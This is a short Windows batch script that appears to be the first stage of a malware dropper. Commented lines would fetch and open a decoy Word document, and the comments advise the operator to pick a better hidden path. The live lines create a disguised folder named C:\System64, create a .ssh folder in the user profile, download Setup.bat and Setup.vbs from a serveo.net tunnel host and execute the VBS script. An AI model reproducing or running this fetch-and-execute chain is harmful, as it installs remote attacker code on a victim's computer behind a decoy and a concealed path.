@echo off
Rem curl http://your_hostname.serveo.net/document.docx -o %USERPROFILE%\Downloads\document.docx
Rem START WINWORD %USERPROFILE%\Downloads\document.docx
Rem you can add a download for a different file to open here.

mkdir C:\System64\
Rem you can choose a better hidden path if you wish to.

mkdir %USERPROFILE%\.ssh

curl http://your_hostname.serveo.net/Setup.bat -o C:\System64\Setup.bat
curl http://your_hostname.serveo.net/Setup.vbs -o C:\System64\Setup.vbs

cscript C:\System64\Setup.vbs
